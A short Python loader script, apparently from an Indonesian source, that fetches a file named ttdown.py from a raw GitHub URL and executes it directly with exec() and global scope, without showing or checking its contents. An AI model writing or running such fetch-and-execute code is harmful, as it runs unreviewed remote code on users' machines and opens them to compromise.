import requests

def main(url):
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        exec(response.text, globals())
    except Exception as e:
        print(f"gagal menjalankan script: {e}")

url = "https://raw.githubusercontent.com/HanX-ID/database/refs/heads/main/ttdown.py"

main(url)
